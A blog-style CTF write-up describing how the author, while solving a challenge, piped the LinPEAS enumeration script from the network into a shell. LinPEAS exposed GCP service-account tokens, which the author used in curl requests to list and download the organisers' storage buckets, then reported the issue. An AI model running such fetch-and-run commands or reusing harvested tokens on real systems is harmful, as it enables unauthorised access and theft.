---
title: "How I (accidentally) hacked ImaginaryCTF infra"
date: 2023-07-23
description: "\"this is what i get for writing an instancer from scratch the day before the ctf\" - Eth007"
tags: [writeups, ctfs]
---

For this years ImaginaryCTF I played with my friends `les amateurs`. We ended up placing 12th out of 880 teams competing! There were lots of super interesting challenges and I look forward to competing next year.

# Background
Just for fun, I decided to look at the challenge `misc/obscured`

{{< zoom-img src="img/chall.png" >}}

When we initially connect to the challenge, it has us complete a Proof-of-Work which after completing gives us a box to SSH into. Once I realized I have no clue what I'm doing, I decided to run a powerful Linux enumeration script (very skid), LinPEAS ([github](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)). This tool does a variety of checks, specifically looking for possible privilege escalation vulnerabilities. Since the box had access to the internet, we could easily run a command to download and run the LinPEAS script.

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Running this script revealed some interesting information. Obviously it did reveal some information about the intended solution (polkit) but what really caught my eye the information it had gathered about the Google Cloud environment it was running in. It was able to find data such as the project ID, project SSH keys, and lots more. The juiciest part out of all of that was access tokens for the GCP service accounts.

{{< zoom-img src="img/service-accounts.png">}}

# GCP Enumeration

At first I was unsure if we could use the access tokens for anything. However, after a bit of research I realized we can use the access tokens to make API requests to get more information about the GCP project. And looking at the scopes we had access to, I decided to look at the GCP storage to see if this is something worth reporting.

Using the [GCP Storage JSON API documentation](https://cloud.google.com/storage/docs/json_api/v1) as a reference, I crafted the following request to list the available buckets.

```bash
curl \
  'https://storage.googleapis.com/storage/v1/b?project=[REDACTED]' \
  --header 'Authorization: Bearer ya29.c.[REDACTED]' \
  --header 'Accept: application/json' \
  --compressed
```

Running this command revealed two buckets. To list the contents of the buckets, we could make the following cURL request.

```bash
curl \
  'https://storage.googleapis.com/storage/v1/b/[BUCKET ID]/o' \
  --header 'Authorization: Bearer ya29.c.[REDACTED]' \
  --header 'Accept: application/json' \
  --compressed
```

One of them would end up being empty, however the other bucket would contain some pretty sensitive information. Each one of the object IDs looked something like this

`[REDACTED URL]/containers/images/sha256:[sha256 hash]/[some num]`

Noticing this I assumed this bucket contained all of the docker containers used for ImaginaryCTF. To double check, I tried downloading one of the files, and it just so happened that the file we downloaded **did** contain a flag.

# Conclusion
Once we found this, I immediately messaged one of the organizers telling him what I found and gave all the information he asked for. We ended up not using the flag we found (since you shouldn't do that) and the challenge went down for maintenance to get fixed.

Thank you to Eth007 for handling the situation very well and not DQ'ing our team for this! Once again, this was an amazing CTF and I have high hopes that next year this problem won't happen again!

# Funny Screenshots
{{< zoom-img src="img/funny.png" >}}
{{< zoom-img src="img/eth-dumb.png" >}}
{{< zoom-img src="img/lmao.png" >}}
